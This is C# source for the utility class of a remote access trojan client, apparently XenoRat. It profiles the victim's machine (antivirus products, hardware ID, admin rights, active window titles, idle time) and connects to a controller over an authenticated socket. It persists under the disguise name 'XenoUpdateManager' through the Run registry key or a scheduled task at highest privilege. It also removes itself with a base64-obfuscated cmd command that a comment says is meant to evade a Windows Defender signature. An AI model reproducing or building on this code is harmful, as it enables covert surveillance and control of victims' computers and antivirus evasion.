using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace xenonClient
{
    public class Utils
    {
        // P/Invoke declarations for external Windows functions
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        internal struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        public static async Task<string> GetCaptionOfActiveWindowAsync() 
        {
            return await Task.Run(() => GetCaptionOfActiveWindow());
        }
        // Synchronously gets the caption (title) of the active window
        public static string GetCaptionOfActiveWindow()
        {
            IntPtr handle = GetForegroundWindow();
            int length = GetWindowTextLength(handle) + 1;
            StringBuilder stringBuilder = new StringBuilder(length);
            if (GetWindowText(handle, stringBuilder, length) > 0)
            {
                uint pid;
                GetWindowThreadProcessId(handle, out pid);
                Process proc = Process.GetProcessById((int)pid);
                string title = stringBuilder.ToString();
                string processName = proc.ProcessName;
                proc.Dispose();
                return string.IsNullOrEmpty(title) ? processName : $"{processName} - {title}";
            }
            return string.Empty;
        }

        public static bool IsAdmin()
        {
            try
            {
                return IsUserAnAdmin();
            }
            catch
            {
                return false;
            }
        }

        // Retrieves the installed antivirus product name
        public static string GetAntivirus()
        {
            List<string> antivirus = new List<string>();
            try
            {
                string path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (ManagementObject instance in searcher.Get())
                    {
                        string displayName = instance.GetPropertyValue("displayName").ToString();
                        if (!antivirus.Contains(displayName))
                        {
                            antivirus.Add(displayName);
                        }
                    }
                }
            }
            catch
            {

            }
            return antivirus.Count > 0 ? string.Join(", ", antivirus) : "N/A";
        }

        // Retrieves the Windows version and architecture
        public static string GetWindowsVersion()
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return $"{obj["Caption"]} - {obj["OSArchitecture"]}";
                }
            }
            return "Unknown";
        }
        // Generates a hardware ID based on system information
        public static string HWID()
        {
            try
            {
                string data = string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                return GetHash(data);
            }
            catch
            {
                return "UNKNOWN";
            }
        }

        // Computes an MD5 hash of the given string and returns the first 20 characters in uppercase
        public static string GetHash(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                foreach (byte b in hashBytes)
                {
                    sb.Append(b.ToString("x2"));
                }
                return sb.ToString().ToUpper().Substring(0, 20);
            }
        }
        // Asynchronously connects to a socket and performs setup
        public static async Task<Node> ConnectAndSetupAsync(Socket socket, byte[] key, int type = 0, int ID = 0, Action<Node> onDisconnect = null)
        {
            try
            {
                Node connection = new Node(new SocketHandler(socket, key), onDisconnect);
                if (!(await connection.AuthenticateAsync(type, ID)))
                {
                    return null;
                }
                return connection;
            }
            catch
            {
                return null;
            }
        }
        public async static Task RemoveStartup(string executablePath) 
        {
            await Task.Run(() =>
            {
                if (Utils.IsAdmin())
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "schtasks.exe";
                        process.StartInfo.Arguments = $"/query /v /fo csv";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        try { process.WaitForExit(); } catch { }
                        process.Dispose();
                        string[] csv_data = output.Split('\n');
                        if (csv_data.Length > 1)
                        {
                            List<string> keys = csv_data[0].Replace("\"", "").Split(',').ToList();
                            int nameKey = keys.IndexOf("TaskName");
                            int actionKey = keys.IndexOf("Task To Run");
                            foreach (string csv in csv_data)
                            {
                                string[] items = csv.Split(new string[] { "\",\"" }, StringSplitOptions.None);
                                if (keys.Count != items.Length)
                                {
                                    continue;
                                }
                                if (nameKey == -1 || actionKey == -1)
                                {
                                    continue;
                                }

                                if (items[actionKey].Replace("\"", "").Trim() == executablePath)
                                {
                                    try
                                    {
                                        Process proc = new Process();
                                        proc.StartInfo.FileName = "schtasks.exe";
                                        proc.StartInfo.Arguments = $"/delete /tn \"{items[nameKey]}\" /f";
                                        proc.StartInfo.UseShellExecute = false;
                                        proc.StartInfo.RedirectStandardOutput = true;
                                        proc.StartInfo.CreateNoWindow = true;

                                        proc.Start();
                                        try { proc.WaitForExit(); } catch { }
                                        process.Dispose();
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                    catch { }
                }
                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                try
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                    {
                        foreach (string i in key.GetValueNames())
                        {
                            if (key.GetValue(i).ToString().Replace("\"", "").Trim() == executablePath)
                            {
                                key.DeleteValue(i);
                            }
                        }
                    }
                }
                catch
                {
                }
            });

            
        }
        public async static Task Uninstall() 
        {
            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
            await RemoveStartup(Assembly.GetEntryAssembly().Location);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + Assembly.GetEntryAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Process.GetCurrentProcess().Kill();
        }

        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
        {
            return await Task.Run(() =>
                   {
                        string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                        try
                        {
                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                            {
                                key.SetValue(name, "\"" + executablePath + "\"");
                            }
                            return true;
                        }
                        catch
                        {
                            return false;
                        }
                   });
        }
        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
        {
            try
            {
                string xmlContent = $@"
                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
                  <Triggers>
                    <LogonTrigger>
                      <Enabled>true</Enabled>
                    </LogonTrigger>
                  </Triggers>
                  <Principals>
                    <Principal id='Author'>
                      <LogonType>InteractiveToken</LogonType>
                      <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                  </Principals>
                  <Settings>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                  </Settings>
                  <Actions>
                    <Exec>
                      <Command>{executablePath}</Command>
                    </Exec>
                  </Actions>
                </Task>";

                string tempXmlFile = Path.GetTempFileName();
                File.WriteAllText(tempXmlFile, xmlContent);

                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = $"/Create /TN \"{name}\" /XML \"{tempXmlFile}\" /F";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                await Task.Delay(3000);
                string output = process.StandardOutput.ReadToEnd();

                File.Delete(tempXmlFile);

                if (output.Contains("SUCCESS"))
                {
                    return true;
                }
            }
            catch
            {
                
            }

            return false; 
        }

        public static async Task<uint> GetIdleTimeAsync() 
        {
            return await Task.Run(() => GetIdleTime());
        }
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInput = new LASTINPUTINFO();
            lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
            GetLastInputInfo(ref lastInput);
            return ((uint)Environment.TickCount - lastInput.dwTime);
        }
    }
}
